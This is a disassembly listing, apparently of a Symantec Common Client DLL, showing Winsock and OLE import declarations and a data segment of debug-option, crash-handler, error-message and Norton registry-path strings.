; int __stdcall	WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF	lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS)
		extrn WSAConnect:dword	; CODE XREF: Ordinal1127+17p
					; DATA XREF: Ordinal1127+17r
; int __stdcall	listen(SOCKET s, int backlog)
		extrn listen:dword	; CODE XREF: Ordinal1129+2Bp
					; DATA XREF: Ordinal1129+2Br
; SOCKET __stdcall WSAAccept(SOCKET s, struct sockaddr *addr, LPINT addrlen, LPCONDITIONPROC lpfnCondition, DWORD_PTR dwCallbackData)
		extrn WSAAccept:dword	; CODE XREF: Ordinal1131+36p
					; DATA XREF: Ordinal1131+36r
; int __stdcall	WSARecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped,	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
		extrn WSARecv:dword	; CODE XREF: Ordinal1132+37p
					; DATA XREF: Ordinal1132+37r
; BOOL __stdcall WSAGetOverlappedResult(SOCKET s, LPWSAOVERLAPPED lpOverlapped,	LPDWORD	lpcbTransfer, BOOL fWait, LPDWORD lpdwFlags)
		extrn WSAGetOverlappedResult:dword ; CODE XREF:	Ordinal1133+BFp
					; DATA XREF: Ordinal1133+BFr
; int __stdcall	WSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent,	DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE	lpCompletionRoutine)
		extrn WSASend:dword	; CODE XREF: Ordinal1133+87p
					; Ordinal1133+FFp
					; DATA XREF: ...
; int __stdcall	shutdown(SOCKET	s, int how)
		extrn shutdown:dword	; CODE XREF: Ordinal1134+25p
					; DATA XREF: Ordinal1134+25r
; int __stdcall	WSAStartup(WORD	wVersionRequested, LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; CODE XREF: Ordinal1119+1Dp
					; DATA XREF: Ordinal1119+1Dr
; int __stdcall	setsockopt(SOCKET s, int level,	int optname, const char	*optval, int optlen)
		extrn setsockopt:dword	; CODE XREF: Ordinal1135+3Fp
					; Ordinal1142+17p ...
; int __stdcall	getsockopt(SOCKET s, int level,	int optname, char *optval, int *optlen)
		extrn getsockopt:dword	; CODE XREF: Ordinal1138+25p
					; Ordinal1145+25p ...
; int __stdcall	ioctlsocket(SOCKET s, __int32 cmd, u_long *argp)
		extrn ioctlsocket:dword	; CODE XREF: Ordinal1139+1Dp
					; Ordinal1140+1Dp
					; DATA XREF: ...
; int __stdcall	getsockname(SOCKET s, struct sockaddr *name, int *namelen)
		extrn getsockname:dword	; CODE XREF: Ordinal1154+18p
					; DATA XREF: Ordinal1154+18r
; int __stdcall	getpeername(SOCKET s, struct sockaddr *name, int *namelen)
		extrn getpeername:dword	; CODE XREF: Ordinal1155+18p
					; DATA XREF: Ordinal1155+18r
; int __stdcall	select(int nfds, fd_set	*readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout)
		extrn select:dword	; CODE XREF: Ordinal1158+44p
					; Ordinal1159+44p
					; DATA XREF: ...
; char *__stdcall inet_ntoa(struct in_addr in)
		extrn inet_ntoa:dword	; CODE XREF: Ordinal1108+19p
					; Ordinal1109+15p
					; DATA XREF: ...
; struct hostent *__stdcall gethostbyaddr(const	char *addr, int	len, int type)
		extrn gethostbyaddr:dword ; CODE XREF: Ordinal1108+Bp
					; Ordinal1109+9p
					; DATA XREF: ...
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; CODE XREF: Ordinal1110+1Bp
					; DATA XREF: Ordinal1110+1Br
; unsigned __int32 __stdcall inet_addr(const char *cp)
		extrn inet_addr:dword	; CODE XREF: Ordinal1110+7p
					; DATA XREF: Ordinal1110+7r
; SOCKET __stdcall WSASocketA(int af, int type,	int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP	g, DWORD dwFlags)
		extrn WSASocketA:dword	; CODE XREF: Ordinal1121+1Fp
					; DATA XREF: Ordinal1121+1Fr
; u_short __stdcall ntohs(u_short netshort)
		extrn ntohs:dword	; CODE XREF: Ordinal1111+7p
					; DATA XREF: Ordinal1111+7r
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; CODE XREF: Ordinal1135+67p
					; DATA XREF: Ordinal1135+67r
; u_long __stdcall htonl(u_long	hostlong)
		extrn htonl:dword	; CODE XREF: Ordinal1102+Fp
					; DATA XREF: Ordinal1102+Fr
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; CODE XREF: Ordinal1112+7p
					; DATA XREF: Ordinal1112+7r

;
; Imports from ole32.dll
;
; HRESULT __stdcall CreateStreamOnHGlobal(HGLOBAL hGlobal, BOOL	fDeleteOnRelease, LPSTREAM *ppstm)
		extrn CreateStreamOnHGlobal:dword ; CODE XREF: Ordinal381+BAp
					; Ordinal380+60p
					; DATA XREF: ...
; HRESULT __stdcall GetHGlobalFromStream(LPSTREAM pstm,	HGLOBAL	*phglobal)
		extrn GetHGlobalFromStream:dword ; CODE	XREF: Ordinal380+B4p
					; DATA XREF: Ordinal380+B4r
; HRESULT __stdcall OleSaveToStream(LPPERSISTSTREAM pPStm, LPSTREAM pStm)
		extrn OleSaveToStream:dword ; CODE XREF: Ordinal380+7Fp
					; DATA XREF: Ordinal380+7Fr
; HRESULT __stdcall CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit)
		extrn CoInitializeEx:dword ; CODE XREF:	Ordinal446+56p
					; DATA XREF: Ordinal446+56r
; void __stdcall CoUninitialize()
		extrn CoUninitialize:dword ; CODE XREF:	Ordinal447+10p
					; DATA XREF: Ordinal447+10r
; HRESULT __stdcall CoCreateInstance(const IID *const rclsid, LPUNKNOWN	pUnkOuter, DWORD dwClsContext, const IID *const	riid, LPVOID *ppv)
		extrn CoCreateInstance:dword ; CODE XREF: Ordinal830+1Ap
					; DATA XREF: Ordinal830+1Ar
; HRESULT __stdcall OleLoadFromStream(LPSTREAM pStm, const IID *const iidInterface, LPVOID *ppvObj)
		extrn OleLoadFromStream:dword ;	CODE XREF: Ordinal381+10Cp
					; DATA XREF: Ordinal381+10Cr


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 6AF54448h
		dd 3 dup(0)
		dd 41301957h, 0
		dd 2, 5Ah, 31B08h, 30708h, 4 dup(0)
		dd 1, 3	dup(0)
		dd 655AC403h, 4596CA11h, 68106B8h, 0B5C6255h
dword_6AF5449C	dd 5BCAB915h, 418E6A6Eh, 57C10B97h, 8CA2AB3h ; DATA XREF: sub_6AF35AD2+13o
dword_6AF544AC	dd 0C2262E11h, 4405DA05h, 0D5DD70BBh, 0BF7ACDEAh
					; DATA XREF: sub_6AF334FE+13o
dword_6AF544BC	dd 0BD7FE322h, 43F56A8Fh, 0FEABADB3h, 82EF507h ; DATA XREF: sub_6AF37705+13o
		dd offset dword_6AF5451C
		dd offset dword_6AF54518
		dd offset dword_6AF54514
		dd offset byte_6AF54510
		dd offset aVal		; "Val"
		dd offset aForceremove	; "ForceRemove"
		dd offset aNoremove	; "NoRemove"
		dd offset aDelete	; "Delete"
aDelete		db 'Delete',0           ; DATA XREF: .rdata:6AF544E8o
		align 4
aNoremove	db 'NoRemove',0         ; DATA XREF: .rdata:6AF544E4o
		align 10h
aForceremove	db 'ForceRemove',0      ; DATA XREF: .rdata:6AF544E0o
aVal		db 'Val',0              ; DATA XREF: .rdata:6AF544DCo
; unsigned __int8 byte_6AF54510
byte_6AF54510	db 42h			; DATA XREF: Ordinal937+2Co
					; .rdata:6AF544D8o
		align 4
dword_6AF54514	dd 44h			; DATA XREF: .rdata:6AF544D4o
					; .rdata:6AF5DC34o
dword_6AF54518	dd 4Dh			; DATA XREF: .rdata:6AF544D0o
dword_6AF5451C	dd 53h			; DATA XREF: .rdata:6AF544CCo
; IID rclsid
rclsid		dd 323h			; Data1	; DATA XREF: Ordinal830+15o
		dw 0			; Data2
		dw 0			; Data3
		db 0C0h, 6 dup(0), 46h	; Data4
stru_6AF54530	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF31153, \
					; DATA XREF: sub_6AF31139+2o
				   offset loc_6AF31161>	; SEH scope table for function 6AF31139
		dd offset aSoftwareSymant ; "Software\\Symantec\\Common	Client"
		dd offset ValueName	; "Version"
; char ValueName[]
ValueName	db 'Version',0          ; DATA XREF: Ordinal131+36o
					; Ordinal132+33o ...
; char aSoftwareSymant[]
aSoftwareSymant	db 'Software\Symantec\Common Client',0 ; DATA XREF: Ordinal131+17o
					; Ordinal132+17o ...
off_6AF5456C	dd offset sub_6AF31267	; DATA XREF: Ordinal129+8o Ordinal130o
; char aCcommonclienti[]
aCcommonclienti	db 'CCommonClientInfo::GetVersion() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal131:loc_6AF311EEo
					; Ordinal132:loc_6AF3124Do
		align 4
off_6AF545A8	dd offset sub_6AF312D2	; DATA XREF: Ordinal133+8o Ordinal134o
		dd offset Ordinal564
aCcrashhandle_1	db 'CCrashHandler::LoadOptions() : Enable() == FALSE',0Ah,0
					; DATA XREF: Ordinal135+5Co
		align 4
aCcrashhandle_0	db 'CCrashHandler::LoadOptions() : SetOptions() == FALSE',0Ah,0
					; DATA XREF: Ordinal135+4Ao
		align 4
; char aCcrashhandlerL[]
aCcrashhandlerL	db 'CCrashHandler::LoadOptions() : debugOptions.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal135+2Co
		align 4
		dd offset aSoftwareSyma_0 ; "Software\\Symantec\\Common	Client\\Debug"
		dd offset aCrashhandler	; "CrashHandler"
		dd offset aDebugoutput	; "DebugOutput"
		dd offset aDumponnew	; "DumpOnNew"
		dd offset aTerminateonnew ; "TerminateOnNew"
		dd offset aThrowonnew	; "ThrowOnNew"
		dd offset aDumponexceptio ; "DumpOnException"
		dd offset aTerminateonexc ; "TerminateOnException"
		dd offset aDumponpurecall ; "DumpOnPurecall"
		dd offset aTerminateonpur ; "TerminateOnPurecall"
		dd offset aDumponsecurity ; "DumpOnSecurity"
		dd offset aTerminateonsec ; "TerminateOnSecurity"
		dd offset aDirectory	; "Directory"
		dd offset aDumptype	; "DumpType"
		dd offset aAppenddatetime ; "AppendDateTimeToFile"
		dd offset aAppendversiont ; "AppendVersionToFile"
		dd offset aDebugtype	; "DebugType"
		dd offset aDirectory	; "Directory"
		dd offset aOutputtodebugg ; "OutputToDebugger"
		dd offset aOutputtofile	; "OutputToFile"
		dd offset aAppendprocessi ; "AppendProcessIdToFile"
		dd offset aPrependthreadi ; "PrependThreadId"
		dd offset aPrependprocess ; "PrependProcessId"
		dd offset aPrependdatetim ; "PrependDateTime"
		dd offset aPrependmodulen ; "PrependModuleName"
		dd offset aAppendnewline ; "AppendNewLine"
		dd offset pszSubKey	; "Modules"
; char pszSubKey[]
pszSubKey	db 'Modules',0          ; DATA XREF: Ordinal147+2BBo
					; Ordinal144+2A6o ...
; char aAppendnewline[]
aAppendnewline	db 'AppendNewLine',0    ; DATA XREF: Ordinal147+2A9o
					; Ordinal144+287o ...
		align 10h
; char aPrependmodulen[]
aPrependmodulen	db 'PrependModuleName',0 ; DATA XREF: Ordinal147+291o
					; Ordinal144+273o ...
		align 4
; char aPrependdatetim[]
aPrependdatetim	db 'PrependDateTime',0  ; DATA XREF: Ordinal147+279o
					; Ordinal144+25Fo ...
; char aPrependprocess[]
aPrependprocess	db 'PrependProcessId',0 ; DATA XREF: Ordinal147+261o
					; Ordinal144+24Bo ...
		align 4
; char aPrependthreadi[]
aPrependthreadi	db 'PrependThreadId',0  ; DATA XREF: Ordinal147+249o
					; Ordinal144+237o ...
; char aAppendprocessi[]
aAppendprocessi	db 'AppendProcessIdToFile',0 ; DATA XREF: Ordinal147+231o
					; Ordinal144+223o ...
		align 10h
; char aOutputtofile[]
aOutputtofile	db 'OutputToFile',0     ; DATA XREF: Ordinal147+219o
					; Ordinal144+20Fo ...
		align 10h
; char aOutputtodebugg[]
aOutputtodebugg	db 'OutputToDebugger',0 ; DATA XREF: Ordinal147+201o
					; Ordinal144+1FBo ...
		align 4
; char aDebugtype[]
aDebugtype	db 'DebugType',0        ; DATA XREF: Ordinal147+1D0o
					; Ordinal144+1D3o ...
		align 10h
; char aAppendversiont[]
aAppendversiont	db 'AppendVersionToFile',0 ; DATA XREF: Ordinal147+194o
					; Ordinal144+1A2o ...
; char aAppenddatetime[]
aAppenddatetime	db 'AppendDateTimeToFile',0 ; DATA XREF: Ordinal147+17Co
					; Ordinal144+18Eo ...
		align 4
; char aDumptype[]
aDumptype	db 'DumpType',0         ; DATA XREF: Ordinal147+164o
					; Ordinal144+17Ao ...
		align 4
; char aDirectory[]
aDirectory	db 'Directory',0        ; DATA XREF: Ordinal147+149o
					; Ordinal147+1E6o ...
		align 4
; char aTerminateonsec[]
aTerminateonsec	db 'TerminateOnSecurity',0 ; DATA XREF: Ordinal147+133o
					; Ordinal144+152o ...
; char aDumponsecurity[]
aDumponsecurity	db 'DumpOnSecurity',0   ; DATA XREF: Ordinal147+11Bo
					; Ordinal144+13Eo ...
		align 4
; char aTerminateonpur[]
aTerminateonpur	db 'TerminateOnPurecall',0 ; DATA XREF: Ordinal147+103o
					; Ordinal144+12Ao ...
; char aDumponpurecall[]
aDumponpurecall	db 'DumpOnPurecall',0   ; DATA XREF: Ordinal147+EBo
					; Ordinal144+116o ...
		align 4
; char aTerminateonexc[]
aTerminateonexc	db 'TerminateOnException',0 ; DATA XREF: Ordinal147+D3o
					; Ordinal144+102o ...
		align 4
; char aDumponexceptio[]
aDumponexceptio	db 'DumpOnException',0  ; DATA XREF: Ordinal147+BBo
					; Ordinal144+EEo ...
; char aThrowonnew[]
aThrowonnew	db 'ThrowOnNew',0       ; DATA XREF: Ordinal147+A3o
					; Ordinal144+DAo ...
		align 10h
; char aTerminateonnew[]
aTerminateonnew	db 'TerminateOnNew',0   ; DATA XREF: Ordinal147+8Bo
					; Ordinal144+C6o ...
		align 10h
; char aDumponnew[]
aDumponnew	db 'DumpOnNew',0        ; DATA XREF: Ordinal147+73o
					; Ordinal144+B2o ...
		align 4
aDebugoutput	db 'DebugOutput',0      ; DATA XREF: Ordinal150+49o
					; .rdata:6AF54664o
aCrashhandler	db 'CrashHandler',0     ; DATA XREF: Ordinal150+2Co
					; .rdata:6AF54660o
		align 4
aSoftwareSyma_0	db 'Software\Symantec\Common Client\Debug',0 ; DATA XREF: Ordinal146o
					; Ordinal143o ...
		align 10h
off_6AF54890	dd offset sub_6AF313F3	; DATA XREF: sub_6AF3136A+21o
					; sub_6AF313A8+11o ...
		dd offset unknown_libname_1 ; Microsoft	VisualC	2-10/net runtime
off_6AF54898	dd offset sub_6AF3140F	; DATA XREF: sub_6AF3142Bo
					; sub_6AF31CCD+42o ...
		dd offset unknown_libname_1 ; Microsoft	VisualC	2-10/net runtime
off_6AF548A0	dd offset sub_6AF31436	; DATA XREF: sub_6AF31452o
					; sub_6AF31E92+43o ...
		dd offset unknown_libname_1 ; Microsoft	VisualC	2-10/net runtime
aMapSetTTooLong	db 'map/set<T> too long',0 ; DATA XREF: sub_6AF31CCD+1Bo
					; sub_6AF35D39+1Bo ...
aInvalidMapSetT	db 'invalid map/set<T> iterator',0 ; DATA XREF: sub_6AF31E92+1Co
					; sub_6AF35F21+1Co ...
; char a0x08x[]
a0x08x		db '0x%08X',0           ; DATA XREF: Ordinal148+1B5o
					; sub_6AF325B5+1Fo ...
		align 10h
; char aCatlexception[]
aCatlexception	db 'CAtlException',0    ; DATA XREF: Ordinal148+1A0o
					; sub_6AF325B5+Ao ...
		align 10h
; char aCccatchS[]
aCccatchS	db 'CCCATCH : %s',0Ah,0 ; DATA XREF: Ordinal148+184o
					; Ordinal148+1D9o ...
		align 10h
; char aStdBad_alloc[]
aStdBad_alloc	db 'std::bad_alloc',0   ; DATA XREF: Ordinal148+15Do
					; sub_6AF32572+Ao ...
		align 10h
; char aS_dmp[]
aS_dmp		db '\%s.dmp',0          ; DATA XREF: Ordinal148+140o
aCdebugoption_0	db 'CDebugOptions::Apply()',0 ; DATA XREF: Ordinal148:loc_6AF323A9o
		align 10h
; char aCdebugoptionsA[]
aCdebugoptionsA	db 'CDebugOptions::Apply() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal148+F0o
; char aSS[]
aSS		db '%s\%s',0            ; DATA XREF: Ordinal150+34o
		align 4
aCdebugoptionsB	db 'CDebugOptions::BuildRegPath()',0 ; DATA XREF: Ordinal150+18o
		align 4
; char aCdebugoption_3[]
aCdebugoption_3	db 'CDebugOptions::Save() : reg.SetNumber() == FALSE',0Ah,0
					; DATA XREF: Ordinal147:loc_6AF32BAAo
					; Ordinal147:loc_6AF32BB1o
		align 10h
; char aCdebugoption_2[]
aCdebugoption_2	db 'CDebugOptions::Save() : mapReg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal147+2EAo
; char aCdebugoption_1[]
aCdebugoption_1	db 'CDebugOptions::Save() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal147:loc_6AF32A26o
		align 10h
; char aCdebugoptionsS[]
aCdebugoptionsS	db 'CDebugOptions::Save() : BuildRegPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal147+30o
		align 4
aCdebugoption_6	db 'CDebugOptions::Load()',0 ; DATA XREF: Ordinal144:loc_6AF32FDAo
		align 4
aCdebugoption_5	db 'CDebugOptions::Load() : mapReg.GetNumber() == FALSE',0Ah,0
					; DATA XREF: Ordinal144+355o
		align 4
; char aCdebugoption_4[]
aCdebugoption_4	db 'CDebugOptions::Load() : mapReg.EnumValue() != ERROR_SUCCESS',0Ah,0
					; DATA XREF: Ordinal144+318o
		align 4
; char aCdebugoptionsL[]
aCdebugoptionsL	db 'CDebugOptions::Load() : BuildRegPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal144+66o
		align 4
off_6AF54B18	dd offset sub_6AF3322D	; DATA XREF: Ordinal140+6o
					; Ordinal137+6o
off_6AF54B1C	dd offset sub_6AF33337	; DATA XREF: Ordinal151+Co Ordinal152o
		dd offset Ordinal647
		dd offset Ordinal155
aInvalidDequeTS	db 'invalid deque<T> subscript',0 ; DATA XREF: sub_6AF33387+Do
		align 4
aDequeTTooLong	db 'deque<T> too long',0 ; DATA XREF: sub_6AF333E4+Do
		align 4
; char aCindexvaluec_2[]
aCindexvaluec_2	db 'CIndexValueCollection::SaveArchive() : SaveValue() == FALSE',0Ah,0
					; DATA XREF: Ordinal179:loc_6AF33769o
		align 4
aCindexvaluec_1	db 'CIndexValueCollection::SAveArchive() : Archive.Write() == FALSE',0Ah
					; DATA XREF: Ordinal179:loc_6AF33762o
		db 0
		align 10h
; char aCindexvaluec_0[]
aCindexvaluec_0	db 'CIndexValueCollection::SaveArchive() : Archive.Write() == FALSE',0Ah
					; DATA XREF: Ordinal179:loc_6AF336F7o
		db 0
		align 8
aCindexvaluecol	db 'CIndexValueCollection::SaveArchive() : CValueCollection::SaveArch'
					; DATA XREF: Ordinal179+15o
		db 'ive() == false',0Ah,0
		align 10h
; char aCindexvaluec_3[]
aCindexvaluec_3	db 'CIndexValueCollection::GetReadValue() : dwIndex >= m_ValueDeque.s'
					; DATA XREF: Ordinal176+14o
		db 'ize()',0Ah,0
; char aCindexvaluec_4[]
aCindexvaluec_4	db 'CIndexValueCollection::GetWriteValue() : dwIndex >= m_ValueDeque.'
					; DATA XREF: Ordinal177+17o
		db 'size()',0Ah,0
		align 4
off_6AF54D14	dd offset sub_6AF3490D	; DATA XREF: Ordinal156+Bo
					; Ordinal157+3o ...
		dd offset _purecall
		dd offset Ordinal176
		dd offset Ordinal177
		dd offset Ordinal178
		dd offset Ordinal179
		align 10h
; char aCindexvaluec_5[]
aCindexvaluec_5	db 'CIndexValueCollection::Remove() : dwIndex >= m_ValueDeque.size()',0Ah
					; DATA XREF: Ordinal161+26o
		db 0
		align 4
aCindexvaluec_6	db 'CIndexValueCollection::Load()',0 ; DATA XREF: Ordinal180+1Do
		align 4
; char aCindexvaluec_7[]
aCindexvaluec_7	db 'CIndexValueCollection::AddValue(bool) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal164+2Do
		align 4
; char aCindexvaluec_8[]
aCindexvaluec_8	db 'CIndexValueCollection::AddValue(BYTE) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal165+2Do
		align 4
; char aCindexvaluec_9[]
aCindexvaluec_9	db 'CIndexValueCollection::AddValue(WORD) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal166+2Do
		align 4
; char aCindexvalue_10[]
aCindexvalue_10	db 'CIndexValueCollection::AddValue(DWORD) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal167+2Do
		align 8
; char aCindexvalue_11[]
aCindexvalue_11	db 'CIndexValueCollection::AddValue(ULONGLONG) : AddValue() == false',0Ah
					; DATA XREF: Ordinal168+2Do
		db 0
		align 4
; char aCindexvalue_12[]
aCindexvalue_12	db 'CIndexValueCollection::AddValue(double) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal169+2Do
		align 4
; char aCindexvalue_13[]
aCindexvalue_13	db 'CIndexValueCollection::AddValue(long) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal170+2Do
					; Ordinal171+37o
		align 10h
; char aCindexvalue_15[]
aCindexvalue_15	db 'CIndexValueCollection::AddValue(LPVOID) : pValue->m_Raw.NewAlloc('
					; DATA XREF: Ordinal171+72o
		db ') == NULL',0Ah,0
		align 10h
; char aCindexvalue_14[]
aCindexvalue_14	db 'CIndexValueCollection::AddValue(LPVOID) : pData == NULL && dwSize'
					; DATA XREF: Ordinal171:loc_6AF346E9o
		db ' > 0',0Ah,0
		align 4
; char aCindexvalue_17[]
aCindexvalue_17	db 'CIndexValueCollection::AddValue(VARIANT) : VariantCopyInd() != S_'
					; DATA XREF: Ordinal174+4Fo
		db 'OK, 0x%08X',0Ah,0
		align 4
; char aCindexvalue_16[]
aCindexvalue_16	db 'CIndexValueCollection::AddValue(VARIANT) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal174+2Do
; char aCindexvalue_18[]
aCindexvalue_18	db 'CIndexValueCollection::AddValue(ISymBase) : AddValue() == false',0Ah
					; DATA XREF: Ordinal175+2Do
		db 0
		align 4
aCindexvalue_19	db 'CIndexValueCollection::operator =()',0 ; DATA XREF: Ordinal159+31o
; char aCindexvalue_25[]
aCindexvalue_25	db 'CIndexValueCollection::Copy() : pValueCollection->GetType() == fa'
					; DATA XREF: Ordinal163:loc_6AF34C6Bo
		db 'lse',0Ah,0
		align 4
aCindexvalue_24	db 'CIndexValueCollection::Copy() : CopyValue() == false',0Ah,0
					; DATA XREF: Ordinal163:loc_6AF34C64o
		align 10h
aCindexvalue_23	db 'CIndexValueCollection::Copy() : GetWriteValue() == false',0Ah,0
					; DATA XREF: Ordinal163:loc_6AF34C5Do
		align 4
aCindexvalue_22	db 'CIndexValueCollection::Copy()',0 ; DATA XREF: Ordinal163:loc_6AF34AD0o
		align 10h
aCindexvalue_21	db 'CIndexValueCollection::Copy() : pValueCollection->GetCount() == f'
					; DATA XREF: Ordinal163+8Bo
		db 'alse',0Ah,0
		align 4
; char aCindexvalue_20[]
aCindexvalue_20	db 'CIndexValueCollection::Copy() : pIndexValueCollection == NULL',0Ah,0
					; DATA XREF: Ordinal163+53o
		align 4
; char aCindexvalue_31[]
aCindexvalue_31	db 'CIndexValueCollection::LoadArchive() : LoadValue() == false',0Ah,0
					; DATA XREF: Ordinal178:loc_6AF34E55o
		align 4
aCindexvalue_30	db 'CIndexValueCollection::LoadArchive() : GetWriteValue() == false',0Ah
					; DATA XREF: Ordinal178:loc_6AF34E4Eo
		db 0
		align 4
aCindexvalue_29	db 'CIndexValueCollection::LoadArchive()',0
					; DATA XREF: Ordinal178:loc_6AF34D22o
		align 4
aCindexvalue_28	db 'CIndexValueCollection::LoadArchive() : switch(default)',0Ah,0
					; DATA XREF: Ordinal178+6Bo
		align 10h
; char aCindexvalue_27[]
aCindexvalue_27	db 'CIndexValueCollection::LoadArchive() : Archive.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal178+4Fo
					; Ordinal178+85o ...
aCindexvalue_26	db 'CIndexValueCollection::LoadArchive() : CValueCollection::LoadArch'
					; DATA XREF: Ordinal178+33o
		db 'ive() == false',0Ah,0
		align 4
aCindexvalue_33	db 'CIndexValueCollection::AddValue(LPCSTR)',0
					; DATA XREF: Ordinal172:loc_6AF34F16o
; char aCindexvalue_32[]
aCindexvalue_32	db 'CIndexValueCollection::AddValue(LPCSTR) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal172+43o
		align 4
aCindexvalue_35	db 'CIndexValueCollection::AddValue(LPCWSTR)',0
					; DATA XREF: Ordinal173:loc_6AF3506Eo
		align 4
; char aCindexvalue_34[]
aCindexvalue_34	db 'CIndexValueCollection::AddValue(LPCWSTR) : AddValue() == false',0Ah,0
					; DATA XREF: Ordinal173+43o
		dd offset aSoftwareSyma_1 ; "Software\\Symantec\\InstalledApps"
		dd offset aCommonClient	; "Common Client"
		dd offset aCommonClientDa ; "Common Client Data"
		dd offset aCommonClientDe ; "Common Client Decomposers"
		dd offset aNav		; "NAV"
		dd offset aNortonInternet ; "Norton Internet Security"
		dd offset aInternetSecuri ; "Internet Security"
		dd offset aNortonIntern_0 ; "Norton Internet Security Data"
		dd offset aInternetSecu_0 ; "Internet Security Data"
		dd offset aAntispam	; "AntiSpam"
		dd offset aAntispamEngine ; "AntiSpam Engine"
		dd offset aAdblocking	; "AdBlocking"
		dd offset aSpbbc	; "SPBBC"
		dd offset aSoftwareMicr_0 ; "Software\\Microsoft\\Windows\\CurrentVersi"...
		dd offset aCommonfilesdir ; "CommonFilesDir"
		dd offset aSoftwareMicros ; "Software\\Microsoft\\Windows\\CurrentVersi"...
		dd offset aCommonAppdata ; "Common AppData"
		dd offset Str		; "\\Symantec\\Common Client"
		dd offset aDecomposers	; "\\Decomposers"
		dd offset aSymantecShared ; "\\Symantec	Shared"
; char aSymantecShared[]
aSymantecShared	db '\Symantec Shared',0 ; DATA XREF: sub_6AF35645+AAo
					; .rdata:6AF554F4o
		align 4
; char aDecomposers[]
aDecomposers	db '\Decomposers',0     ; DATA XREF: Ordinal190+40o
					; .rdata:6AF554F0o
		align 4
; char Str[]
Str		db '\Symantec\Common Client',0 ; DATA XREF: Ordinal188+D2o
					; .rdata:6AF554ECo
; char aCommonAppdata[]
aCommonAppdata	db 'Common AppData',0   ; DATA XREF: Ordinal188+9Fo
					; .rdata:6AF554E8o
		align 8
; char aSoftwareMicros[]
aSoftwareMicros	db 'Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders',0
					; DATA XREF: Ordinal188+6Do
					; .rdata:6AF554E4o
		align 4
; char aCommonfilesdir[]
aCommonfilesdir	db 'CommonFilesDir',0   ; DATA XREF: sub_6AF35645+78o
					; .rdata:6AF554E0o
		align 4
; char aSoftwareMicr_0[]
aSoftwareMicr_0	db 'Software\Microsoft\Windows\CurrentVersion',0
					; DATA XREF: sub_6AF35645+49o
					; .rdata:6AF554DCo
		align 4
; char aSpbbc[]
aSpbbc		db 'SPBBC',0            ; DATA XREF: Ordinal203+8o
					; Ordinal204+4o ...
		align 10h
; char aAdblocking[]
aAdblocking	db 'AdBlocking',0       ; DATA XREF: Ordinal201+8o
					; Ordinal202+4o ...
		align 4
; char aAntispamEngine[]
aAntispamEngine	db 'AntiSpam Engine',0  ; DATA XREF: Ordinal199+8o
					; Ordinal200+4o ...
; char aAntispam[]
aAntispam	db 'AntiSpam',0         ; DATA XREF: Ordinal197+8o
					; Ordinal198+4o ...
		align 4
; char aInternetSecu_0[]
aInternetSecu_0	db 'Internet Security Data',0 ; DATA XREF: Ordinal195+21o
					; Ordinal196+18o ...
		align 10h
; char aNortonIntern_0[]
aNortonIntern_0	db 'Norton Internet Security Data',0 ; DATA XREF: Ordinal195+8o
					; Ordinal196+4o ...
		align 10h
; char aInternetSecuri[]
aInternetSecuri	db 'Internet Security',0 ; DATA XREF: Ordinal193+21o
					; Ordinal194+18o ...
		align 4
; char aNortonInternet[]
aNortonInternet	db 'Norton Internet Security',0 ; DATA XREF: Ordinal193+8o
					; Ordinal194+4o ...
		align 10h
; char aNav[]
aNav		db 'NAV',0              ; DATA XREF: Ordinal191+8o
					; Ordinal192+4o ...
; char aCommonClientDe[]
aCommonClientDe	db 'Common Client Decomposers',0 ; DATA XREF: Ordinal190+Bo
					; .rdata:6AF554B4o
		align 10h
; char aCommonClientDa[]
aCommonClientDa	db 'Common Client Data',0 ; DATA XREF: Ordinal188+Bo
					; .rdata:6AF554B0o
		align 4
; char aCommonClient[]
aCommonClient	db 'Common Client',0    ; DATA XREF: Ordinal186+7o
					; Ordinal185+Eo ...
		align 4
; char aSoftwareSyma_1[]
aSoftwareSyma_1	db 'Software\Symantec\InstalledApps',0 ; DATA XREF: Ordinal183+17o
					; Ordinal184+17o ...
off_6AF556C4	dd offset unknown_libname_2 ; DATA XREF: Ordinal181+2o
					; Ordinal182o ...
					; Microsoft VisualC 2-10/net runtime
aCinstalledap_0	db 'CInstalledApps::GetDirectory() : reg.GetString() == FALSE',0Ah,0
					; DATA XREF: Ordinal183+4Fo
					; Ordinal184+4Co
		align 4
; char aCinstalledapps[]
aCinstalledapps	db 'CInstalledApps::GetDirectory() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal183+2Do
					; Ordinal184+2Do
		align 10h
; char aCinstalleda_12[]
